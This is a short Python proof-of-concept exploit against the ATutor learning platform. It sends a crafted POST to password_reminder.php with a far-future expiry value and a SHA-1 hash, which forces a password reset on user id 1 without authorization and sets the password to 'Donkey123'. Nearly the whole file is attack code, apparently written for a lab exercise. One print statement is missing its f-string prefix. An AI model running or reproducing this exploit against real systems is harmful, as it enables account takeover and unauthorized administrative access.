import hashlib, sys, requests

def update_password(ip, id, password):
    data = {
            "g" : 9999999999,
            "id" : id,
            "h" : 0,
            "form_password_hidden" : hashlib.sha1(password.encode('utf-8')).hexdigest(),
            "form_change" : ""
    }
    url = "http://%s/ATutor/password_reminder.php" % (ip)
    print("(*) Issuing password reset to URL: %s" % url)
    requests.post(url, data)

def main():
    password = 'Donkey123'
    update_password('atutor', str(1), password)
    print("(+) Password changed to: {password}")

if __name__ == "__main__":
    main()